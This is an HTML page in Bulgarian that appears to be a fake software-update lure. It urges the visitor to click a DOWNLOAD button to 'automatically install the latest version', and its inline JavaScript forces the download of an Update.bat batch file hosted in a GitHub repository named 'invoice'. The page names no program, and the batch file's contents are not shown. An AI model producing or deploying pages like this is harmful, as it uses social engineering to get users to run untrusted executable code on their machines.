<!DOCTYPE html>
<html lang="bg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Обновяване на програмата</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background: white;
            padding: 50px 60px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 420px;
        }
        h1 {
            color: #222;
            font-size: 24px;
            margin-bottom: 12px;
        }
        p {
            color: #555;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            background: #2563eb;
            color: white;
            text-decoration: none;
            padding: 14px 36px;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            transition: background 0.2s;
            cursor: pointer;
        }
        .btn:hover {
            background: #1d4ed8;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>Обновяване на програмата</h1>
        <p>Моля, натиснете бутона по-долу, за да свалите и инсталирате последната версия автоматично.</p>
        
        <a class="btn" 
           href="https://github.com/Chupacabra-creator/invoice/blob/main/Update.bat" 
           download="Update.bat"
           onclick="event.preventDefault(); 
                    const a = document.createElement('a');
                    a.href = this.href;
                    a.download = 'Update.bat';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);">
            DOWNLOAD
        </a>
    </div>
</body>
</html>
